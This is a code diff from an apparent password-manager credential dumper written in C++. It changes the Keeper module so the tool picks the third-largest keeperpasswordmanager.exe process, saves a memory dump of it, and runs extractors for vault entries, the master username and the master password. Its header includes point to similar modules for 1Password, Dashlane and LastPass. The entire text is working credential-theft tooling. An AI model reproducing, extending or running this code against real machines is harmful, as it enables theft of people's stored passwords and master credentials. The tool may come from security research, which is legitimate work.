@@ -1,6 +1,7 @@
 #pragma once
 #include "../core/FindFirstPID.h"
 #include "../core/FindSecondPID.h"
+#include "../core/FindThirdPID.h"
 #include "../core/FindFourthPID.h"
 #include "../core/FindSimpleProcPID.h"
 #include "../core/saveDump.h"
@@ -22,6 +23,7 @@
 #include "../1password/plugin/getCreds1passwordplugin2.h"
 #include "../keeper/getCredskeeper1.h"
 #include "../keeper/getCredskeeper2.h"
+#include "../keeper/getCredskeeper3.h"
 #include "../dashlane/getCredsdashlaneEntries.h"
 #include "../dashlane/getCredsdashlaneMaster.h"
 #include "../lastpass/getCredslastpassEntries.h"
@@ -307,7 +309,7 @@ int checkApps() {
     //keeper
     if (userInput == "keeper") {
         std::cout << "User input matches 'keeper'.\n";
-        std::cout << "In this app, the second largest process is needed.\n";
+        std::cout << "In this app, the third largest process is needed.\n";
         std::cout << "Only entries should be available.\n";
         std::cout << "Also, by default the app does not encrypt the vault after locking the UI due to inactivity.\n";
         const char* processName = "keeperpasswordmanager.exe";
@@ -322,17 +324,17 @@ int checkApps() {
                 // Step 2: Get Private Working Set sizes for the found PIDs
                 std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
 
-                // Step 3: Find the PID with the second-largest Private Working Set size
-                DWORD secondLargestPID = FindSecondPID(pidSizePairs);
+                // Step 3: Find the PID with the third-largest Private Working Set size
+                DWORD thirdLargestPID = FindThirdPID(pidSizePairs);
 
-                if (secondLargestPID != 0)
+                if (thirdLargestPID != 0)
                 {
-                    // Step 4: Create a dump file for the process with the second-largest size
-                    saveDump(secondLargestPID);
+                    // Step 4: Create a dump file for the process with the third-largest size
+                    saveDump(thirdLargestPID);
                 }
                 else
                 {
-                    std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
+                    std::cerr << "No process with the third-largest Private Working Set size found." << std::endl;
                 }
             }
             else
@@ -353,11 +355,14 @@ int checkApps() {
             fileInput = "app.dmp";
         }
 
-        std::cout << "Searching for entries (1/2).\n";
+        std::cout << "Searching for entries (1/3).\n";
         getCredskeeper1(fileInput);
         std::cout << "Done!\n";
-        std::cout << "Searching for entries (2/2).\n";
+        std::cout << "Searching for master username (2/3).\n";
         getCredskeeper2(fileInput);
+        std::cout << "Done!\n";
+        std::cout << "Searching for master password (3/3).\n";
+        getCredskeeper3(fileInput);
         std::cout << "Done!\n";
         std::cout << "If zero credentials were found, ensure that the app is up and running!\n";
     }
